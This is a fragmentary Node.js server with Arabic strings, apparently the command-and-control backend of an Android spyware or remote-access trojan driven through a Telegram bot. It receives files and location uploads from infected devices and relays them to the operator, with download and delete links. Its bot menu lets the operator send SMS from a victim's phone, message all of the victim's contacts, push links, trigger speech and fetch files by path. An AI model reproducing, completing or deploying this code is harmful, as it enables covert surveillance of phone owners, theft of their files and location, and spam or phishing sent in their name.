...
// صفحة البداية تعرض رسالة نجاح
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تحميل السيرفر بنجاح</h1>')
})
...
app.get('/getFile/*', function (req, res) {
  ...
  fs.stat(filePath, function(err, stat) {
    if(err == null) {
      ...
      res.send(`<h1>الملف غير موجود</h1>`)
    } else {
      res.send(`<h1>خطأ، لم يتم العثور على الملف</h1>`)
    }
  });
})
  ...
  fs.stat(filePath, function(err, stat) {
    if (err == null) {
      fs.unlink(filePath, (err) => {
        if (err) {
          res.send(`<h1>لم يتم حذف الملف "${fileName}"</h1>` + `<br><br>` + `<h1>!حاول مرة أخرى!</h1>`)
        } else {
          res.send(`<h1>تم حذف الملف "${fileName}" بنجاح</h1>` + `<br><br>` + `<h1>نجاح!!!</h1>`)
        }
      });
    } else if (err.code === 'ENOENT') {
      // الملف غير موجود
      res.send(`<h1>الملف "${fileName}" غير موجود للحذف.</h1>`)
    } else {
      res.send('<h1>خطأ آخر: </h1>', err.code)
    }
  });
})
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> الجهاز\n\n اسم الملف: ` + name + ` \n معرف الملف: ` + file_name + `\n\n رابط الملف: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n رابط الحذف: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
...
app.post("/uploadLocation", (req, res) => {
    ...
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> الجهاز`,
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
...
// معالجة الاتصال الجديد عبر WebSocket
...
// معالجة الرسائل الواردة في بوت تيليجرام
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء الرد بالرقم الذي تريد إرسال الرسالة إليه')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
                '• انتبه أن الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك أكثر من الحد المسموح به',
        ...
        if (message.reply_to_message.text.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            ...
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• ستتلقى الرد خلال لحظات'
            )
        }
    if (message.reply_to_message.text.includes('°• اكتب الرسالة التي تود ارسالها الى جميع جهات الاتصال')) {
        ...
        if (message.reply_to_message.text.includes('°• الرابط التي تريد ارساله')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
        ...
        if (message.reply_to_message.text.includes('°• النص الذي تريد نطقه')) {
        ...
        if (message.reply_to_message.text.includes('°• مسار الملف الذي تريد تحميله')) {
